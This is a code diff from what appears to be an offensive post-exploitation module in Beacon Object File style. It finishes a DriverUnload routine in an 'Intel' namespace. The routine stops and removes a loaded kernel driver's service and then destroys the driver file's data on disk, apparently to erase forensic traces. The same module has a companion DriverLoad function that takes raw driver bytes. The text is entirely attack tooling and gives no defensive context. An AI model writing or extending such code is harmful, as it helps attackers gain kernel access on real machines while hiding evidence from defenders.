@@ -186,19 +186,31 @@ namespace Intel {
 		return true;
 	}
 
-	BOOL DriverUnload(HANDLE handle, wchar_t *driver_name) {
+	BOOL DriverUnload(HANDLE handle, wchar_t *driver_name, size_t size) {
 
+		BOOL success = false;
 		if (handle && handle != INVALID_HANDLE_VALUE) {
 			KERNEL32$CloseHandle(handle);
 		}
 
 		wchar_t *driver_path = GetDriverPath(driver_name);
 		if (!ServiceStopRemove(driver_path)) {
-			return false;
+			goto defer;
 		}
 
-		// TODO: FINISH
+		if (!Beacon$DestroyFileData(driver_path, size)) {
+			goto defer;
+		}
 		
+		success = true;
+
+	defer:
+		if (driver_path) {
+			NTDLL$RtlFreeHeap(GetProcessHeap(), 0, driver_path);
+			driver_path = nullptr;
+		}
+
+		return success;
 	}
 
 	HANDLE DriverLoad(wchar_t *driver_name, uint8_t *driver, size_t size) {
